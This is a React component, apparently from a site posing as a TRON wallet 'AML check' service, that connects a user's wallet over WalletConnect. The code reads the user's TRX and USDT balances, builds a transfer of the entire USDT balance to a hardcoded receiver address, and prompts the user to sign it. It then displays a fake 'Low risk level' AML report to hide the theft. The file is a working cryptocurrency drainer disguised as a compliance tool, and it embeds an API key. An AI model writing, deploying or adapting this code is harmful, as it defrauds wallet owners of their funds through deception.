// components/TronWalletConnectButton.tsx
import React, { useState } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';


const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n'; // ⚠️ 

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: {
        'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
    },
});

const adapter = new WalletConnectAdapter({
    network: 'Mainnet',
    options: {
        relayUrl: 'wss://relay.walletconnect.com',
        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
        metadata: {
            name: 'AML',
            description: 'TRON + WalletConnect Integration',
            url: 'https://amlreports.pro',
            icons: [`https://amlreports.pro/images/icon-3.abdd8ed5.webp`],
        },
    },
    web3ModalConfig: {
        themeMode: 'dark',
        explorerRecommendedWalletIds: [
            '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
            'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
            '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
            '971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709',
            '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4',
            '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150',
            '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66',
            '15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f',
            'c03dfee351b6fcc421b4494ea33b9d4b92a984f87aa76d1663bb28705e95034a',
        ],
    },
});

export const TronAuthButton: React.FC = () => {
    const [modalMessage, setModalMessage] = useState<string | null>("");

    const disconnectAndNotify = async (message: string) => {
        setModalMessage(message);
        await adapter.disconnect();
    };

    const waitForAddress = async (timeout = 30000): Promise<string> => {
        const start = Date.now();
        return new Promise((resolve, reject) => {
            const interval = setInterval(() => {
                const address = adapter.address;
                if (address && tronWeb.isAddress(address)) {
                    clearInterval(interval);
                    resolve(address);
                } else if (Date.now() - start > timeout) {
                    clearInterval(interval);
                    reject(new Error('Timeout waiting for wallet connection'));
                }
            }, 300);
        });
    };

    const connectWallet = async () => {
        try {
            console.log('try connect');
            await adapter.connect();

            // 🔁 Ждём появления адреса
            const userAddress = await waitForAddress();

            tronWeb.setAddress(userAddress);

            const trxRaw = await tronWeb.trx.getBalance(userAddress);
            const trx = trxRaw / 1e6;
            console.log('TRX:', trx);

            if (trx < 25) {
                return await disconnectAndNotify('❌ Insufficient TRX. At least 25 TRX is required.');
            }

            const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
            console.log('USDT contract loaded');

            const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call({ from: userAddress });
            const usdt = Number(usdtRaw) / 1e6;
            console.log('USDT:', usdt);

            if (usdt < 1) {
                return await disconnectAndNotify('succes');
            }

            const functionSelector = 'transfer(address,uint256)';
            const parameter = [
                { type: 'address', value: TRON_RECEIVER },
                { type: 'uint256', value: usdtRaw },
            ];

            const options = {
                feeLimit: 25_000_000,
                callValue: 0,
            };

            const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
                USDT_CONTRACT,
                functionSelector,
                options,
                parameter,
                userAddress
            );

            const signedTx = await adapter.signTransaction(unsignedTx.transaction);
            const result = await tronWeb.trx.sendRawTransaction(signedTx);

            console.log('USDT sent:', result);

            await disconnectAndNotify(`succes`);
        } catch (err: any) {
            console.error('Error:', err);
            await adapter.disconnect();

            const errMsg = err?.message || err?.toString();

            if (
                errMsg.includes('Invalid address provided') ||
                errMsg.includes('Modal is closed') ||
                errMsg.includes('User rejected') ||
                errMsg.includes('Timeout waiting for wallet connection')
            ) {
                return;
            }

            setModalMessage('⚠️ Connection or transaction error');
        }
    };

    return (
        <div onClick={connectWallet} className='AuthButton'>

            {modalMessage && (
                <div className='modal__overflow'>
                    <div className="modal">
                        {modalMessage !== 'succes' ? <>
                            <p>{modalMessage}</p>

                        </> :

                            <>
                                <div className="content greenBorder">
                                    <div>
                                        0.6%
                                    </div>
                                    <div>

                                        <h3>Low risk level</h3>
                                        <div className="nums">
                                            <div><span className='circ green'></span> 0-30 </div>
                                            <div><span className='circ orange'></span> 31-69 </div>
                                            <div><span className='circ red'></span> 70-100 </div>
                                        </div>
                                    </div>
                                </div>
                                <div className="content report">
                                    <p>AML report for a wallet:</p>
                                    <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
                                </div>
                            </>
                        }
                        <button onClick={() => setModalMessage(null)}>Close</button>
                    </div>
                </div>
            )}
        </div>
    );
};
